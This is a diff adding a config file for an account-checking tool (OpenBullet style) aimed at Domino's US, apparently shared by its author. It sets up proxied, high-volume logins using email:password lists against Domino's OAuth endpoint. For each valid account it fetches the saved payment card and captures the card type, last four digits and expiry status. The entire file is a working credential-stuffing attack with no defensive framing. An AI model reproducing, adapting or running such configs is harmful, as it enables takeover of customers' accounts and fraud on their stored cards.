@@ -1,0 +1,123 @@
+[SETTINGS]
+{
+  "Name": "Dominos US 12-30-19",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-12-30T10:56:53.132031-08:00",
+  "AdditionalInfo": "USE SOCKS5 | Ancient#0001",
+  "Author": "Ancient#0001",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": true,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.dominos.com/as/token.oauth2" 
+  CONTENT "validator_id=VoldemortCredValidatorCustID&client_id=iOS-rm&username=<USER>&password=<PASS>&grant_type=password&scope=customer:card:read customer:profile:read:extended customer:orderHistory:read customer:card:update customer:profile:read:basic customer:loyalty:read customer:orderHistory:update customer:card:create customer:loyaltyHistory:read order:place:cardOnFile customer:card:delete customer:orderHistory:create customer:profile:update" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Host: api.dominos.com" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "Accept: /" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Content-Length: 465" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: DominosiOS/6.8.2 (iOS 13.2; iPhone; en)" 
+  HEADER "X-DPZ-D: 477A9399-5474-4788-87D0-B63612D48BA3" 
+  HEADER "Cookie: PF=uzIdCZ4ZeFBUVuj6pyBTAO" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username & password combination" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "AT1" 
+
+REQUEST POST "https://order.dominos.com/power/login" 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: order.dominos.com" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "Accept: /" 
+  HEADER "Authorization: Bearer <AT1>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "Content-Length: 0" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: DominosiOS/6.8.2 (iOS 13.2; iPhone; en)" 
+  HEADER "X-DPZ-D: 477A9399-5474-4788-87D0-B63612D48BA3" 
+
+PARSE "<SOURCE>" JSON "CustomerID" -> VAR "CID" 
+
+REQUEST GET "https://order.dominos.com/power/customer/<CID>/card?rememberMe=true&_=1577730792921" 
+  
+  HEADER "Host: order.dominos.com" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "Accept: application/vnd.dominos.customer.card+json;version=1.0" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "Authorization: Bearer <AT1>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "DPZ-Language: en" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/14.0b12646 Mobile/15E148 Safari/605.1.15" 
+  HEADER "Referer: https://order.dominos.com/assets/build/xdomain/proxy.html" 
+  HEADER "X-Return-Forbidden-Status: true" 
+  HEADER "X-DPZ-D: 86ad796a-4715-4de7-924a-820f7efc3d35" 
+  HEADER "Cookie: utag_main=v_id:016f58156aa300161289f3cdd3990008e00ef0860053e$_sn:1$_ss:0$_st:1577732612039$ses_id:1577730796196%3Bexp-session$_pn:1%3Bexp-session$vapi_domain:dominos.com; s_sq=%5B%5BB%5D%5D; AMCVS_1F046398524DCCF80A490D44%40AdobeOrg=1; AMCV_1F046398524DCCF80A490D44%40AdobeOrg=-1712354808%7CMCIDTS%7C18261%7CMCMID%7C34700156192886174604755591584870457193%7CMCAID%7CNONE%7CMCOPTOUT-1577737996s%7CNONE%7CvVersion%7C4.3.0; s_cc=true; check=true" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" JSON "cardType" -> CAP "Card Type" 
+
+PARSE "<SOURCE>" JSON "lastFour" -> CAP "Last 4" 
+
+PARSE "<SOURCE>" JSON "isExpired" -> VAR "Expired" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<Expired>" Contains "True" 
+  KEYCHAIN Success OR 
+    KEY "<Expired>" Contains "False" 
+
